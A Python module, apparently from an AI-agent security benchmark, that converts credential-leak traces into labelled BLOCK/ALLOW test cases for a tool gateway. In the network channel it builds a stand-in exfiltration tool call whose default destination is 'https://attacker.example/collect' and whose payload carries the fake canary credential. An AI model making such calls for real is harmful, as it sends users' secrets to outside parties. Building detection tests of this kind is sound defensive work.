"""Deterministic projection: CredentialTrace -> SecurityCase (guide §26-§28).

stdout (A/B, DIRECT) -> TOOL_RESULT  |  network (B, PROJECTED) -> TOOL_CALL.

Validation (guide §44-§46):
  credential_markers non-empty => leakage_expected != UNSET
  BLOCK => flow_class + sink + credential_marker + dynamic_confirmed present
  ALLOW => authorized_sink or safe_redaction present
"""
from __future__ import annotations

import hashlib
import json
from typing import Any

from ...core.enums import ExpectedAction, LeakageExpectation
from ...core.models import SecurityCase
from ..quality import SourceProvenance, attach_provenance
from .models import CredentialTrace


def _norm_sha(text: str) -> str:
    from ..dedup import normalize_text

    return hashlib.sha256(normalize_text(text).encode("utf-8", errors="replace")).hexdigest()


def _raw_sha(text: str) -> str:
    return hashlib.sha256((text or "").encode("utf-8", errors="replace")).hexdigest()


def _validate(  # noqa: C901
    *,
    trace: CredentialTrace,
    expected_action: ExpectedAction,
    leakage_expected: LeakageExpectation,
    credential_markers: list[str],
) -> list[str]:
    errs: list[str] = []
    if credential_markers and leakage_expected == LeakageExpectation.UNSET:
        errs.append("credential_markers non-empty but leakage_expected is UNSET")
    if expected_action == ExpectedAction.BLOCK:
        if not trace.flow_class:
            errs.append("BLOCK: flow_class required")
        if not trace.sink:
            errs.append("BLOCK: sink required")
        if not trace.credential_marker:
            errs.append("BLOCK: credential_marker required")
        # benign inline redacted controls also set expected_action=ALLOW, so
        # BLOCK without dynamic_confirmed is an error. For offline-synthesized
        # gate-visible traces, dynamic_confirmed marks "real sink presence" and
        # must be true for BLOCK.
        if not trace.dynamic_confirmed:
            errs.append("BLOCK: dynamic_confirmed required")
    else:  # ALLOW
        meta = trace.metadata or {}
        authorized = bool(meta.get("authorized_sink") or meta.get("authorized"))
        safe = bool(meta.get("safe_redaction") or meta.get("redacted"))
        if not (authorized or safe):
            errs.append("ALLOW: need authorized_sink or safe_redaction")
    return errs


def project_trace_to_case(
    trace: CredentialTrace,
    *,
    dataset_id: str = "credential_traces",
    source_revision: str = "",
    raw_sha256: str = "",
    adapter_version: str = "1.0.0",
    expected_action: ExpectedAction = ExpectedAction.BLOCK,
    leakage_expected: LeakageExpectation = LeakageExpectation.NO_LEAK,
    presentation_style: str = "explicit",
    threat_id: str = "",
    project_id: str = "P4_credential_flow",
) -> SecurityCase:
    """Project one CredentialTrace into one SecurityCase deterministically.

    Each trace already owns its gateway_channel (TOOL_RESULT vs TOOL_CALL), so
    the projection is 1:1. A skill with two sinks (stdout + network) yields two
    cases sharing group_id = skill_id.

    Raises ValueError if validation fails (guide §44-§46).
    """
    channel = trace.gateway_channel.lower()  # tool_result / tool_call
    # BLOCK vs ALLOW determines expected_action; leakage_expected is typically
    # NO_LEAK for BLOCK and also NO_LEAK for ALLOW benign safe flows (canary
    # must not echo even on benign). LEAK_ALLOWED is only for a dedicated test
    # fixture, never for CORE.
    ea = ExpectedAction.from_value(expected_action)
    le = LeakageExpectation.from_value(leakage_expected)
    markers = [trace.credential_marker] if trace.credential_marker else []
    errs = _validate(
        trace=trace,
        expected_action=ea,
        leakage_expected=le,
        credential_markers=markers,
    )
    if errs:
        raise ValueError("; ".join(errs))

    # Source ID must be stable and unique per trace sink (guide §28).
    source_id = f"skillleak:{trace.skill_id}:{trace.issue_id}:{trace.trace_id}:{trace.sink}"
    # Grouping by skill keeps a skill's stdout + network + benign together.
    group_id = trace.skill_id or trace.trace_id

    # Build channel-specific body fields.
    # The offline builder already embedded the canary in payload; projection just
    # places it on the right field (tool_result vs tool_arguments).
    content = trace.payload or ""
    tool_name = trace.tool_name
    tool_args: dict[str, Any] = dict(trace.tool_arguments or {})
    tool_result = ""
    m_target = ""
    m_op = ""

    if channel == "tool_result":
        # stdout exposure: tool result envelope carried the canary
        tool_result = content
        # also expose in content for structured renderer (it prefers tool_result)
        if not tool_name:
            tool_name = trace.skill_name or "skill_tool"
    elif channel == "tool_call":
        # network exfil: structured tool_call envelope
        if not tool_name:
            tool_name = trace.tool_name or "http_request"
        if not tool_args:
            tool_args = {
                "destination": trace.destination or "https://attacker.example/collect",
                "payload": {k: v for k, v in (trace.tool_arguments or {"leak": trace.credential_marker}).items()},
            }
            # ensure the marker appears in at least one arg value when BLOCK
            if ea == ExpectedAction.BLOCK and trace.credential_marker and not any(
                trace.credential_marker in str(v) for v in tool_args.values()
            ):
                tool_args["leak"] = trace.credential_marker
        # also serialize as content for raw fallback consistency
        content = json.dumps(
            {"tool": tool_name, "arguments": tool_args}, ensure_ascii=False, sort_keys=True
        )
        if trace.destination:
            tool_args.setdefault("destination", trace.destination)

    # Operation + direction per channel (guide §10).
    if channel == "tool_result":
        operation = "read"
        direction = "inbound"
    else:
        operation = "execute_tool" if channel == "tool_call" else "send_data"
        direction = "outbound" if channel in ("tool_call", "memory_write") else "inbound"

    # Quality / derivation: stdout is DIRECT (real trace verbatim replacement),
    # network is PROJECTED (real event projected into tool_call envelope).
    if trace.gateway_visibility == "DIRECT":
        quality = "A"
        derivation = "original"
        # fallback: for overwrite, keep DIRECT even when offline-synthesized
    elif trace.gateway_visibility == "PROJECTED":
        quality = "B"
        derivation = "deterministic_projection"
    else:
        quality = "B"
        derivation = "deterministic_projection"

    base = SecurityCase.build(
        dataset_id=dataset_id,
        source_id=source_id,
        channel=channel,
        operation=operation,
        direction=direction,
        content=content,
        expected_action=ea,
        project_id=project_id,
        threat_id=threat_id or trace.pattern.lower().replace(" ", "_"),
        user_intent=trace.skill_name or "",
        tool_name=tool_name,
        tool_arguments=tool_args,
        tool_result=tool_result,
        credential_markers=markers,
        leakage_expected=le,
        presentation_style=presentation_style,
        memory_target=m_target,
        memory_operation=m_op,
        metadata={
            # Phase 2 trace lineage + visibility for reporting
            "skill_id": trace.skill_id,
            "skill_name": trace.skill_name,
            "issue_id": trace.issue_id,
            "academic_code": trace.academic_code,
            "pattern": trace.pattern,
            "classification": trace.classification,
            "severity": trace.severity,
            "flow_class": trace.flow_class,
            "gateway_visibility": trace.gateway_visibility,
            "sink": trace.sink,
            "derived_channel": trace.gateway_channel,
            "credential_kind": "fake_canary",
            "dynamic_confirmed": bool(trace.dynamic_confirmed),
            "source_revision": trace.source_revision or source_revision,
            "sandbox_version": trace.sandbox_version,
            "trace_id": trace.trace_id,
            "trace_hash": trace.trace_hash,
            "quality_tier": quality,
            "derivation": derivation,
            # for P4 ALLOW benign controls
            **{k: v for k, v in (trace.metadata or {}).items() if k in ("authorized_sink", "authorized", "safe_redaction", "redacted")},
            # keep original trace metadata extras that are safe
            "trace_destination": trace.destination,
        },
    )

    # Attach uniform provenance (stored under metadata.source)
    prov = SourceProvenance(
        source_dataset=dataset_id,
        source_revision=source_revision or trace.source_revision or "",
        source_id=source_id,
        group_id=group_id,
        raw_sha256=raw_sha256 or _raw_sha(content),
        normalized_sha256=_norm_sha(content),
        adapter_name="credential_traces",
        adapter_version=adapter_version,
        quality_tier=quality,
        derivation=derivation,
    )
    # Ensure group_id is in metadata for sampler grouping (skill-level split).
    d = base.to_dict()
    meta = dict(d.get("metadata") or {})
    meta["group_id"] = group_id
    # also surface parent lineage for reporting
    d["metadata"] = meta
    base = SecurityCase.from_dict(d)
    return attach_provenance(base, prov)
